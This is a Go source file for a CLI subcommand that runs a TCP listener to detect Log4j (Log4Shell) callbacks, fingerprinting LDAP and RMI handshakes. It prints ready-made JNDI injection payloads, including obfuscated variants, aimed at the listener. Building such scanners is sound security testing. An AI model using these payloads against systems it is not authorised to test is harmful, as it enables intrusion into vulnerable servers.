package cmd

import (
	"fmt"
	"github.com/spf13/cobra"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
)

/*
	log4j扫描程序服务器,用来查看是否有漏洞
*/
var (
	log4listenAddr string
)

var Log4jCmd = &cobra.Command{
	Use:   "log4j",
	Short: "Open a socket listener to test log4J vulnerabilities offline",
	Run: func(cmd *cobra.Command, args []string) {
		if log4listenAddr == "" {
			_ = cmd.Help()
		}
		t := strings.Split(log4listenAddr, ":")
		if len(t) == 2 {
			Println(Clearln + "Press ctrl+c to shutdown")
			go Log4jCheckServer(t[0], t[1])
			c := make(chan os.Signal, 1)
			signal.Notify(c, os.Interrupt, syscall.SIGTERM)
			<-c
			Println(Clearln + "ctrl+c detected. Shutting down")
		}
	},
}

func init() {
	Log4jCmd.Flags().StringVarP(&log4listenAddr, "bind", "b", "0.0.0.0:4568", "socket listen address")
}

func Log4j2HandleRequest(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 1024)
	num, err := conn.Read(buf)
	if err != nil {
		Println(fmt.Sprintf(Clearln+"accept data reading err %v", err))
		_ = conn.Close()
		return
	}
	hexStr := fmt.Sprintf("%x", buf[:num])
	// LDAP 协议
	if "300c020101600702010304008000" == hexStr {
		Println(fmt.Sprintf("[LDAP] %s Finger:%s", conn.RemoteAddr().String(), hexStr))
		return
	}
	if RMI(buf) {
		Println(fmt.Sprintf("[RMI] %s Finger:%x", conn.RemoteAddr().String(), buf[0:7]))
		return
	}
}

//TODO: https://github.com/KpLi0rn/Log4j2Scan/blob/main/core/server.go

func RMI(data []byte) bool {
	if data[0] == 0x4a && data[1] == 0x52 && data[2] == 0x4d && data[3] == 0x49 {
		if data[4] != 0x00 {
			return false
		}
		if data[5] != 0x01 && data[5] != 0x02 {
			return false
		}
		if data[6] != 0x4b && data[6] != 0x4c && data[6] != 0x4d {
			return false
		}
		lastData := data[7:]
		for _, v := range lastData {
			if v != 0x00 {
				return false
			}
		}
		return true
	}
	return false
}

func Log4jCheckServer(host string, port string) {
	listen, err := net.Listen("tcp", fmt.Sprintf("%s:%s", host, port))
	if err != nil {
		Println(Clearln + "log4j listen server failed")
		return
	}
	defer listen.Close()
	//Println()(fmt.Sprintf("[Log4j2] Listen start on %s:%s",host,port))
	Println(Clearln + "[payload]: ")
	Println(fmt.Sprintf(Clearln+"==> ${${lower:${lower:jndi}}:${lower:ldap}://%v:%v/poc}", host, port))
	Println(fmt.Sprintf(Clearln+"==> ${${::-j}ndi:rmi://%v:%v/poc}", host, port))
	Println(fmt.Sprintf(Clearln+"==> ${jndi:ldap://%v:%v/poc}", host, port))
	Println("-----------------------------------")
	for {
		conn, err := listen.Accept()
		if err != nil {
			Println(fmt.Sprintf(Clearln+"accept failed %v", err))
			continue
		}
		go Log4j2HandleRequest(conn)
	}
}
